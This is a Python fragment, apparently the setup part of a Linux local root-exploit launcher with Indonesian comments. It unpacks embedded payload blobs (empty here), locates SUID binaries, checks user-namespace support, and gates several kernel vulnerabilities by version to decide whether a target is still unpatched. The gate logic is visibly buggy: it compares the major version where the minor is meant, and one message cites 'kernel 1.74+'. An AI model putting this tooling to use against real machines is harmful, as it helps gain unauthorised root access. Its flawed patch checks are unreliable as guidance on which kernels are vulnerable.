SRC_32250 = ""
SRC_0386 = ""

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def info(msg):
    print(f"[*] {msg}")


def ok(msg):
    print(f"{GREEN}[+]{RESET} {msg}")


def fail(msg):
    print(f"{RED}[-]{RESET} {msg}")


def warn(msg):
    print(f"{YELLOW}[!]{RESET} {msg}")


def head(msg):
    print(f"\n{CYAN}{BOLD}== {msg} =={RESET}")


def _unpack(b64data):
    return gzip.decompress(base64.b64decode(b64data))


def _extract_blob(b64data, dest_dir):
    """Ekstrak tar.gz yang di-encode base64 ke dest_dir."""
    os.makedirs(dest_dir, exist_ok=True)
    with gzip.GzipFile(fileobj=io.BytesIO(base64.b64decode(b64data)), mode="rb") as gz:
        import tarfile
        with tarfile.open(fileobj=gz, mode="r:") as tf:
            try:
                tf.extractall(dest_dir, filter="data")
            except TypeError:
                tf.extractall(dest_dir)  # Python < 3.12


def _write_source(b64data, path):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(_unpack(b64data))


def _is_suid(path):
    try:
        st = os.stat(path)
        return bool(st.st_mode & stat.S_ISUID) and bool(st.st_mode & 0o111)
    except OSError:
        return False


def _has_gcc():
    return shutil.which("gcc") is not None


def _unshare_works():
    try:
        r = subprocess.run(
            ["unshare", "-Urnm", "true"],
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL, timeout=10,
        )
        return r.returncode == 0
    except Exception:
        return False


def _kernel_info():
    """Return dict(major, minor, patch, abi, effective, release, flavor)."""
    rel = os.uname().release  # mis. 5.15.0-27-generic / 6.1.158+
    m = re.match(r"^(\d+)\.(\d+)\.(\d+)(?:-(\d+))?", rel)
    if not m:
        return None
    major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
    abi = int(m.group(4)) if m.group(4) else 0
    return {
        "release": rel,
        "major": major, "minor": minor, "patch": patch, "abi": abi,
        "effective": max(patch, abi),
        "ver": (major, minor),
    }


def _find_suid_bin():
    for p in ["/usr/bin/su", "/usr/bin/passwd", "/usr/bin/mount",
              "/usr/bin/umount", "/usr/bin/chsh", "/usr/bin/chfn",
              "/usr/bin/newgrp", "/usr/bin/sudo", "/bin/su", "/bin/mount"]:
        if os.path.exists(p) and _is_suid(p):
            return p
    return None


# ---------------------------------------------------------------------------
# Gate kernel (advisory). ver=(major,minor), eff=max(patch,abi).
# ---------------------------------------------------------------------------
def gate_0847(ver, eff):
    v = ver
    if not ((5, 8) <= v <= (5, 16)):
        return False, "rentang kernel 5.8-5.16"
    if v[0] == 16 and eff >= 11:
        return False, "kernel 5.16.11+ sudah ditambal"
    if v[0] == 15 and eff >= 25:
        return False, "kernel 5.15.25+ sudah ditambal"
    if v[0] == 10 and eff >= 102:
        return False, "kernel 5.10.102+ sudah ditambal"
    return True, ""


def gate_2586(ver, eff):
    v = ver
    if not ((5, 8) <= v <= (5, 17)):
        return False, "rentang kernel 5.8-5.17"
    if v[0] == 15 and eff >= 39:
        return False, "kernel 5.15.39+ sudah ditambal"
    if v[0] == 10 and eff >= 113:
        return False, "kernel 5.10.113+ sudah ditambal"
    if v[0] == 18 and eff >= 1:
        return False, "kernel 5.18.1+ sudah ditambal"
    return True, ""


def gate_32250(ver, eff):
    v = ver
    if not ((5, 8) <= v <= (5, 17)):
        return False, "rentang kernel 5.8-5.17"
    if v[0] == 15 and eff >= 43:
        return False, "kernel 5.15.43+ sudah ditambal"
    if v[0] == 10 and eff >= 119:
        return False, "kernel 5.10.119+ sudah ditambal"
    if v[0] == 18 and eff >= 2:
        return False, "kernel 5.18.2+ sudah ditambal"
    return True, ""


def gate_0995(ver, eff):
    if ver == (5, 13):
        return True, ""
    return False, "hanya kernel 5.13 (offset ROP hardcoded 5.13.0-37-generic)"


def gate_0386(ver, eff):
    if not ((5, 10) <= ver <= (6, 2)):
        return False, "rentang kernel 5.10-6.2"
    if ver == (6, 2) and eff >= 1:
        return False, "kernel 6.2.1+ sudah ditambal"
    if ver == (6, 1) and eff >= 6:
        return False, "kernel 6.1.6+ sudah ditambal"
    if ver == (5, 15) and eff >= 89:
        return False, "kernel 5.15.89+ sudah ditambal"
    if ver == (5, 10) and eff >= 163:
        return False, "kernel 5.10.163+ sudah ditambal"
    return True, ""


def gate_1086(ver, eff):
    v = ver
    if not ((5, 14) <= v <= (6, 6)):
        return False, "rentang kernel 5.14-6.6"
    if v[0] == 6 and eff >= 14:
        return False, "kernel 6.14+ sudah ditambal"
    if v[0] == 1 and eff >= 74:
        return False, "kernel 1.74+ sudah ditambal"
    if v[0] == 15 and eff >= 148:
        return False, "kernel 5.15.148+ sudah ditambal"
    if v[0] == 10 and eff >= 209:
        return False, "kernel 5.10.209+ sudah ditambal"
    if v[0] == 6 and v[1] == 6 and eff >= 15:
        return False, "kernel 6.6.15+ sudah ditambal"
    return True, ""


